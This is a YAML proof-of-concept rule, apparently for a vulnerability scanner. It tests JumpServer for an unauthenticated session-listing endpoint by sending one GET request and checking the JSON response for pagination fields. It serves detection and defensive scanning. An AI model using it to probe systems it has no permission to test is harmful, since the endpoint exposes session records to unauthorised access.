name: poc-yaml-jumpserver-session-replay-unauth
transport: http
rules:
  r0:
    request:
      method: GET
      path: /api/v1/terminal/sessions/?limit=1
      follow_redirects: false
    expression: >-
      response.status == 200 && response.body_string.contains('"count":') &&
      response.body_string.contains('"next":') &&
      response.body_string.contains('"previous":') &&
      response.body_string.contains('"results":')
expression: r0()
detail:
  author: Chaitin
  links:
    - https://stack.chaitin.com/techblog/detail/156